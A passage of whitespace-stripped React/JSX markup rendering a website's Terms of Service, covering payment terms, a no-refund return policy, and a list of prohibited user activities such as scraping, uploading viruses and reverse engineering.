color:'text1',msoThemetint:166,}}><br/></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Youagreetoprovidecurrent,complete,andaccuratepurchaseandaccountinformationforallpurchasesmadeviatheServices.Youfurtheragreetopromptlyupdateaccountandpaymentinformation,includingemailaddress,paymentmethod,andpaymentcardexpirationdate,sothatwecancompleteyourtransactionsandcontactyouasneeded.Salestaxwillbeaddedtothepriceofpurchasesasdeemedrequiredbyus.Wemaychangepricesatanytime.Allpaymentsshallbe&nbsp;</span><spanstyle={{fontSize:15,lineHeight:'115%',fontFamily:'Arial',color:'rgb(89,89,89)',}}>in<bdtclassName='question'>USdollars</bdt>.</span></div></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Youagreetopayallchargesatthepricesthenineffectforyourpurchasesandanyapplicableshippingfees,andyou<bdtclassName='block-component'/>authorize<bdtclassName='statement-end-if-in-editor'/>ustochargeyourchosenpaymentproviderforanysuchamountsuponplacingyourorder.Wereservetherighttocorrectanyerrorsormistakesinpricing,evenifwehavealreadyrequestedorreceivedpayment.</span></div></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>WereservetherighttorefuseanyorderplacedthroughtheServices.Wemay,inoursolediscretion,limitorcancelquantitiespurchasedperperson,perhousehold,orperorder.Theserestrictionsmayincludeordersplacedbyorunderthesamecustomeraccount,thesamepaymentmethod,and/orordersthatusethesamebillingorshippingaddress.Wereservetherighttolimitorprohibitordersthat,inoursole{''}<bdtclassName='block-component'/>judgment<bdtclassName='statement-end-if-in-editor'/>,appeartobeplacedbydealers,resellers,ordistributors.</span><spanstyle={{lineHeight:'115%',fontFamily:'Arial',color:'rgb(89,89,89)',}}><bdtdata-type='conditional-block'style={{color:'rgb(10,54,90)',textAlign:'left'}}><bdtclassName='block-component'data-record-question-key='return_option'data-type='statement'style={{fontSize:15}}/></bdt></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><spanstyle={{fontSize:15}}><bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='returnno'style={{lineHeight:'1.5'}}><strong><spanstyle={{fontSize:19}}>6.<bdtclassName='block-component'/>RETURN<bdtclassName='statement-end-if-in-editor'/>POLICY</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>Allsalesarefinalandnorefundwillbeissued.<bdtclassName='statement-end-if-in-editor'/><bdtclassName='statement-end-if-in-editor'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:'1.5'}}><spanstyle={{lineHeight:'115%',fontFamily:'Arial',color:'rgb(89,89,89)',}}><bdtdata-type='conditional-block'style={{color:'rgb(10,54,90)',textAlign:'left'}}><bdtdata-type='body'><divclassName='MsoNormal'style={{fontSize:15,lineHeight:'1.5'}}><br/></div></bdt></bdt></span><divclassName='MsoNormal'data-custom-class='heading_1'id='prohibited'style={{textAlign:'left',lineHeight:'1.5'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>7.</span></strong></span>&nbsp;</strong></span></strong>PROHIBITEDACTIVITIES</span></strong></div></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:1}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>YoumaynotaccessorusetheServicesforanypurposeotherthanthatforwhichwemaketheServicesavailable.TheServicesmaynotbeusedinconnectionwithanycommercial<bdtclassName='block-component'/>endeavors<bdtclassName='statement-end-if-in-editor'/>exceptthosethatarespecificallyendorsedorapprovedbyus.</span></div></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:1}}><divclassName='MsoNormal'style={{lineHeight:'17.25px'}}><divclassName='MsoNormal'style={{lineHeight:'1.1'}}><divclassName='MsoNormal'style={{lineHeight:'17.25px'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>AsauseroftheServices,youagreenotto:</span></div></div><ul><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontSize:15,fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>SystematicallyretrievedataorothercontentfromtheServicestocreateorcompile,directlyorindirectly,acollection,compilation,database,ordirectorywithoutwrittenpermissionfromus.</span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Trick,defraud,ormisleadusandotherusers,especiallyinanyattempttolearnsensitiveaccountinformationsuchasuserpasswords.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Circumvent,disable,orotherwiseinterferewithsecurity-relatedfeaturesoftheServices,includingfeaturesthatpreventorrestricttheuseorcopyingofanyContentorenforcelimitationsontheuseoftheServicesand/ortheContentcontainedtherein.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Disparage,tarnish,orotherwiseharm,inouropinion,usand/ortheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>UseanyinformationobtainedfromtheServicesinordertoharass,abuse,orharmanotherperson.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Makeimproperuseofoursupportservicesorsubmitfalsereportsofabuseormisconduct.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>UsetheServicesinamannerinconsistentwithanyapplicablelawsorregulations.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Engagein<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>framingoforlinkingtotheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Uploadortransmit(orattempttouploadortotransmit)viruses,Trojanhorses,orothermaterial,includingexcessiveuseofcapitallettersandspamming(continuouspostingofrepetitivetext),thatinterfereswithanyparty’suninterrupteduseandenjoymentoftheServicesormodifies,impairs,disrupts,alters,orinterfereswiththeuse,features,functions,operation,ormaintenanceoftheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Engageinanyautomateduseofthesystem,suchasusingscriptstosendcommentsormessages,orusinganydatamining,robots,orsimilardatagatheringandextractiontools.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>DeletethecopyrightorotherproprietaryrightsnoticefromanyContent.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Attempttoimpersonateanotheruserorpersonorusetheusernameofanotheruser.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Uploadortransmit(orattempttouploadortotransmit)anymaterialthatactsasapassiveoractiveinformationcollectionortransmissionmechanism,includingwithoutlimitation,cleargraphicsinterchangeformats(<bdtclassName='block-component'/>&quot;gifs&quot;<bdtclassName='statement-end-if-in-editor'/>),1×1pixels,webbugs,cookies,orothersimilardevices(sometimesreferredtoas<bdtclassName='block-component'/>&quot;spyware&quot;or&quot;passivecollectionmechanisms&quot;or&quot;pcms&quot;<bdtclassName='statement-end-if-in-editor'/>).</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Interferewith,disrupt,orcreateanundueburdenontheServicesorthenetworksorservicesconnectedtotheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Harass,annoy,intimidate,orthreatenanyofouremployeesoragentsengagedinprovidinganyportionoftheServicestoyou.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>AttempttobypassanymeasuresoftheServicesdesignedtopreventorrestrictaccesstotheServices,oranyportionoftheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>CopyoradapttheServices&apos;software,includingbutnotlimitedtoFlash,PHP,HTML,JavaScript,orothercode.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Exceptaspermittedbyapplicablelaw,decipher,decompile,disassemble,orreverseengineeranyofthesoftwarecomprisingorinanywaymakingupapartoftheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>ExceptasmaybetheresultofstandardsearchengineorInternetbrowserusage,use,launch,develop,ordistributeanyautomatedsystem,includingwithoutlimitation,anyspider,robot,cheatutility,scraper,orofflinereaderthataccessestheServices,oruseorlaunchany<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>scriptorothersoftware.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)